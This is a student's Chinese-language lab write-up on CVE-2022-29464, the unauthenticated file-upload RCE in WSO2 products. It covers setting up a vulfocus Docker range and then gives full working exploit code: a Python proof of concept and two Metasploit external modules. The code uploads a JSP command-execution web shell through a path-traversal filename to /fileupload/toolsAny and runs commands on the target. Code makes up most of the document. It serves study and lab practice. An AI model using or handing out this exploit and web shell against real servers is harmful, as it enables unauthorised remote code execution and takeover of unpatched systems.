---
tags: CVE
---
# cve-2022-29464

## 作者 
黃妤婷: Katherine - 國立成功大學資訊工程學系四年級

## 漏洞名稱
WSO2文件上傳漏洞

##  漏洞說明/描述(成因)
#### 漏洞簡介:
*  WSO2 的文件上傳漏洞，是由 Orange Tsai 所發現，該漏洞允許未經身分驗證的攻擊者通過上傳惡意的 JSP 文件在WSO2伺服器上獲得 RCE  
    >WSO2是一家開源技術提供商
    >該漏洞是一種未經身分驗證的無限制任意文件上傳
    
#### 漏洞類型:
* RCE
    > 遠端程式碼執行（Remote Code Execution)

#### 影響範圍:
* WSO2 API Manager 2.2.0 and above
* WSO2 Identity Server 5.2.0 and above
* WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0
* WSO2 Identity Server as Key Manager 5.3.0 and above
* WSO2 Enterprise Integrator 6.2.0 and above

## 漏洞環境建置
docker 運行 vulfocus 靶場

### 部署vulfocus環境
> 跟著這個部屬環境: [vulfocus 下載](https://www.codegarden.cn/article/4651/)
1. 拉取vulfocus鏡像
    ```shell
    $ docker pull vulfocus/vulfocus:latest
    ```
    ![](https://i.imgur.com/U4uk2Rl.png)
    > 因 terminal 已關掉所以截自上述網址內的圖片 
2. 查看下載的vulfocus鏡像
    ```shell
    $ docker images
    ```
    ![](https://i.imgur.com/dPEV3Q7.png)
3. 運行vulfocus
    * 創建vulfocus容器
        ```shell
        $ docker create -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=172.17.0.1 vulfocus/vulfocus
        ```
        > VUL_IP=172.17.0.1 為Docker服務器 IP，不能為 127.0.0.1。
    
        ![](https://i.imgur.com/wRhUxoD.png)
    
    * 查看所有容器，第一個就是我們剛創建的：
        ```shell
        $ docker ps -a
        ```
        ![](https://i.imgur.com/FHbUfgv.png)
    * 運行vulfocus容器，再啟動容器:
        ```shell
        $ docker start 3b89351509fc #container id
        ```
        ![](https://i.imgur.com/ctmT0aX.png)
    * 再查看vulfocus鏡像的運行狀態：
        ![](https://i.imgur.com/g4lfzJO.png)
    * 表示正在運行，由本地的80端口映射到docker的80端口，最後訪問在主機訪問虛擬機192.168.179.131的80端口即可，Vulfocus服務部署在docker容器的80端口：
        > 打開瀏覽器輸入: http://靶機ip地址:80
        
        ![](https://i.imgur.com/yHNo9AX.png)
        * 顯示如上畫面後輸入帳密: admin/admin登入即可

### 拉取、導入、啟動靶場
>之後跟著 [這個網站](https://cn-sec.com/archives/1010525.html) 繼續進行拉取、導入、啟動靶場等等的動作
* 拉取靶場:
    * 在 https://hub.docker.com/ 搜尋 `wso2-cve_2022_29464` ，並執行 docker pull command
* 導入、啟動靶場:
    * 等靶場拉取完成後，在web管理系統中按照下方圖中步驟導入靶場。
    ![](https://i.imgur.com/XwxfVW2.png)
        > 截自上述網站
    * 在首頁開啟靶場，獲取映射窗口，選擇最後一個 port。之後會用到
    ![](https://i.imgur.com/jv5Q7tv.png)
        > 截自上述網站
* 下載別人寫的 exploit 執行看看，確認漏洞的存在: 
    * https://github.com/hakivvi/CVE-2022-29464/
* 進到該目錄底下執行以下指令，根據返回訊息可判斷 abc.jsp 已成功上傳。

    ![](https://i.imgur.com/sg2RM6n.png)

    > ip 地址為 kali 的 ip ，44349 是前面所選擇的port
    > 上傳名為 abc.jsp 的檔案
* 成功執行命令:
    ![](https://i.imgur.com/Ls3Y3ys.png)

## Metasploit testcase
* 以下是我根據 [hakivvi](https://github.com/hakivvi/CVE-2022-29464/) 改寫的 python POC:
    ```python
    import requests, urllib3, sys
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def find_base_url(args):
        base_url = 'http://{}:{}'.format(args['rhost'], args['RPORT'])
        return base_url

    def make_shell():
        shell = """<FORM>
        <INPUT name='cmd' type=text>
        <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
        <%
        String cmd = request.getParameter("cmd");
        String output = "";
        if(cmd != null) {
            String s = null;
            try {
                Process p = Runtime.getRuntime().exec(cmd,null,null);
                BufferedReader sI = new BufferedReader(new
    InputStreamReader(p.getInputStream()));
                while((s = sI.readLine()) != null) { output += s+"</br>"; }
            }  catch(IOException e) {   e.printStackTrace();   }
        }
    %>
            <pre><%=output %></pre>"""
        return shell

    def exploit(url,files):
        try:
            response = requests.post(url + f'/fileupload/toolsAny', files=files, verify=False)
        except Exception as e:
            print("error")
            return False

        payload = {'cmd': 'ls'}
        url = url + "//authenticationendpoint/abc.jsp"
        print(url)

        try:
            r = requests.get(url,params = payload)
            if not r and r.status_code == 200:
                print("success")
                return False
        except Exception as e:
            print("error")
        print("completed exploit")
        return True

    def main ():
        args = {
            'RPORT': '23089',
            'TARGETURI': '/',
            'METHOD': 'GET',
            'rhost': '192.168.179.xxx'
        }

        base_url = find_base_url(args)
        shell = make_shell()  
        files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/abc.jsp": shell}

        url = "http://" + args['rhost'] + ":" + args['RPORT']

        if exploit(url,files) :
            print("Vulnerable")
        else: 
            print("Error")

        #new add
        url = url + "//authenticationendpoint/abc.jsp"    
        #r = requests.get(url + "?cmd=ls")
        payload = {'cmd': 'ls'}
        r = requests.get(url,params = payload)
        print(r.status_code)
        print(r.text)

    if __name__ == '__main__':
        main()
    ```

    * Output:
        ![](https://i.imgur.com/tBG5AIz.png)


* 在使用 python 確認該 POC 可行，之後試著把它改寫為 metasploit external module
    * 將檔案存在`.msf4/modules/auxiliary/scanner/http` 裡面，並命名為 `wso2_file_upload_rce.py`

    ```python
    #!/usr/bin/env python3

    # standard modules
    from metasploit import module

    # extra modules
    dependencies_missing = False
    try:
        import requests
        import urllib3
        import sys
        import time
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except ImportError:
        dependencies_missing = True

    metadata = {
        'name': 'WSO2 Arbitrary File Upload to RCE',
        'description': '''
            This module abuses a vulnerability in certain WSO2 products that allow unrestricted file
              upload with resultant remote code execution. This affects WSO2 API Manager 2.2.0 and
              above through 4.0.0; WSO2 Identity Server 5.2.0 and above through 5.11.0; WSO2 Identity Server
              Analytics 5.4.0, 5.4.1, 5.5.0, and 5.6.0; WSO2 Identity Server as Key Manager 5.3.0 and above
              through 5.10.0; and WSO2 Enterprise Integrator 6.2.0 and above through 6.6.0.
        ''',
        'authors': [
            'yuting',
        ],
        'date': '2022-05-23',
        'license': 'MSF_LICENSE',
        'references': [
                                    {'type': 'url', 'ref': 'https://github.com/hakivvi/CVE-2022-29464'},
            {'type': 'cve', 'ref': '2022-29464'}
        ],
        'type': 'single_scanner',
        'options': {
            'RPORT': {'type': 'int', 'description': 'Target port', 'required': True, 'default': '/'},
            'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
            'METHOD': {'type': 'string', 'description': 'Vulunarable HTTP method', 'required': True, 'default': 'POST'}
        }
    }


    def find_base_url(args):
        base_url = 'http://{}:{}'.format(args['rhost'], args['RPORT'])
        return base_url

    def make_shell():
        shell = """<FORM>
        <INPUT name='cmd' type=text>
        <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
        <%
        String cmd = request.getParameter("cmd");
        String output = "";
        if(cmd != null) {
            String s = null;
            try {
                Process p = Runtime.getRuntime().exec(cmd,null,null);
                BufferedReader sI = new BufferedReader(new
    InputStreamReader(p.getInputStream()));
                while((s = sI.readLine()) != null) { output += s+"</br>"; }
            }  catch(IOException e) {   e.printStackTrace();   }
        }
    %>
            <pre><%=output %></pre>"""

        return shell

    def exploit(url,files):
        try:
            response = requests.post(url + f'/fileupload/toolsAny', files=files, verify=False)
        except:
            module.log(str(e), level='error')
            return False

        payload = {'cmd': 'ls'}
        url = url + "//authenticationendpoint/abc.jsp"

        try:
            r = requests.get(url,params = payload)
            module.log('success upload abc.jsp',level='good')
            if not r and r.status_code == 200:
                return False
            if(r.text == ""):
                return False
            else:
                module.log('successfully execute cmd',level='good')
        except:
            module.log(str(e), level='error')
            return False

        return True


    def run(args):
        try:
            # dependency check
            if dependencies_missing:
                module.log('Module dependency (requests) is missing, cannot continue', level='error')
                return

            base_url = find_base_url(args)
            shell = make_shell()
            files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/abc.jsp": shell}
            url = base_url

            module.log('File: abc.jsp', level='good')

            if exploit(url,files) :
                module.log('Exploit completed', level='good')    
            else:
                module.log('Exploit failed',level='error')

        except Exception as e:
            module.log(str(e), level='error')


    if __name__ == '__main__':
        module.run(metadata, run)

    ```

## 在Metasploit中使用testcase, 對靶機掃描/利用成功之截圖
![](https://i.imgur.com/kWPJGiP.png)

:::warning
* 建議:
    在 Metasploit 使用 testcase 之前可以先確認用 python POC 是可以成功的，因為:
    1. 可能會有下圖的錯誤`(可能是訪問次數過多被禁止訪問，或是http連接太多等等的原因)`
    2. 使用 vulfocus 啟用的 images 有 30 分鐘的時間限制，要確定時間沒超過或是要記得重開一次，並且要注意 ==port 可能會改變==。
:::
![](https://i.imgur.com/XfvAzyX.png)


-----
### 參考資料
1. [Docker運行vulfocus漏洞靶場](https://www.codegarden.cn/article/4651/)
2. [（CVE-2022-29464)WSO2文件上传漏洞复现](https://cn-sec.com/archives/1010525.html)
3. [WSO2 文件上传漏洞复现（CVE-2022-29464）](https://www.cnblogs.com/lwh01/p/16193991.html)
4. [WSO2 Arbitrary File Upload to RCE - Metasploit](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/wso2_file_upload_rce)
5. [hakivvi/CVE-2022-29464](https://github.com/hakivvi/CVE-2022-29464/)

---
## 後續: 試著改寫為exploit script
* 向元裕老師詢問之後，發現: 因為 auxiliary/scanner 著重在 "無害且具驗證性" 的確認漏洞是否存在，而我有上傳惡意的 jsp 檔案並 RCE，所以其實可以改寫成exploit script。
* 但在改寫後試著進行漏洞利用，有成功上傳 webshell 並 RCE ，但卻==沒有 active session== (如下圖)，目前**還不了解原因出在哪裡** ，還需要更進一步的學習。
* 我將改寫後的檔案放在 `.msf4/modules/exploits/multi/http` 裡面，並命名為 `wso2.py` 
>為了跟上面寫好的 `wso2_file_upload_rce.py` 做區隔故暫時以 `wso2.py` 做命名

![](https://i.imgur.com/EayjLAf.png)
```python
    #!/usr/bin/env python3

    # standard modules
    from metasploit import module

    # extra modules
    dependencies_missing = False
    try:
        import requests
        import urllib3
        import sys
        import time
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except ImportError:
        dependencies_missing = True

    metadata = {
        'name': 'WSO2 Arbitrary File Upload to RCE',
        'description': '''
            This module abuses a vulnerability in certain WSO2 products that allow unrestricted file
              upload with resultant remote code execution. This affects WSO2 API Manager 2.2.0 and
              above through 4.0.0; WSO2 Identity Server 5.2.0 and above through 5.11.0; WSO2 Identity Server
              Analytics 5.4.0, 5.4.1, 5.5.0, and 5.6.0; WSO2 Identity Server as Key Manager 5.3.0 and above
              through 5.10.0; and WSO2 Enterprise Integrator 6.2.0 and above through 6.6.0.
        ''',
        'authors': [
            'yuting',
        ],
        'date': '2022-05-24',
        'license': 'MSF_LICENSE',
        'references': [
                                    {'type': 'url', 'ref': 'https://github.com/hakivvi/CVE-2022-29464'},
            {'type': 'cve', 'ref': '2022-29464'}
        ],
        'type': 'remote_exploit_cmd_stager',
        'targets': [
          {'platform':'linux', 'arch': 'x86'}
        ],
        'payload': {
            'command_stager_flavor': 'curl',
        },
        'options': {
            'RPORT': {'type': 'int', 'description': 'Target port', 'required': True, 'default': '/'},
            'RHOST': {'type': 'address', 'description': 'Target address', 'required': True, 'default': '/'},       
            'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
            'METHOD': {'type': 'string', 'description': 'Vulunarable HTTP method', 'required': True, 'default': 'POST'},
            'COMMAND': {'type': 'string', 'description': 'The command to execute via the cmd GET parameter', 'required': True, 'default': 'ls'}   
        }
    }

    def find_base_url(args):
        base_url = 'http://{}:{}'.format(args['RHOST'], args['RPORT'])
        return base_url

    def make_shell():
        shell = """<FORM>
        <INPUT name='cmd' type=text>
        <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
        <%
        String cmd = request.getParameter("cmd");
        String output = "";
        if(cmd != null) {
            String s = null;
            try {
                Process p = Runtime.getRuntime().exec(cmd,null,null);
                BufferedReader sI = new BufferedReader(new
    InputStreamReader(p.getInputStream()));
                while((s = sI.readLine()) != null) { output += s+"</br>"; }
            }  catch(IOException e) {   e.printStackTrace();   }
        }
    %>
            <pre><%=output %></pre>"""

        return shell

    def exploit(url,files,args):
        try:
            response = requests.post(url + f'/fileupload/toolsAny', files=files, verify=False)
            module.log('success upload abc.jsp',level='good')
        except Exception as e:        
            module.log(str(e), level='error')
            return False

        payload = {'cmd': 'ls'}
        url = url + "//authenticationendpoint/abc.jsp"

        try:
            r = requests.get('{}?cmd={}'.format(url, args['COMMAND']), verify=False)
            if not r and r.status_code == 200:
                return False
            if(r.text == ""):
                return False
            else:
                module.log('successfully execute cmd',level='good')
        except requests.exceptions.RequestException as e:
            module.log(str(e), level='error')
            return False
        module.log(str(r.text))
        '''
        try:
            r = requests.get(url,params = payload)
            module.log('success upload abc.jsp',level='good')
            if not r and r.status_code == 200:
                return False
            if(r.text == ""):
                return False
            else:
                module.log('successfully execute cmd',level='good')
        except:
            module.log(str(e), level='error')
            return False
        '''
        return True


    def run(args):
        try:
            # dependency check
            if dependencies_missing:
                module.log('Module dependency (requests) is missing, cannot continue', level='error')
                return

            base_url = find_base_url(args)
            shell = make_shell()
            files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/abc.jsp": shell}
            url = "http://" + args['RHOST'] + ":" + args['RPORT']

            module.log('File: abc.jsp', level='good')

            if exploit(url,files,args) :
                module.log('Exploit completed', level='good')    
            else:
                module.log('Exploit failed',level='error')

        except Exception as e:
            module.log(str(e), level='error')


    if __name__ == '__main__':
        module.run(metadata, run)
```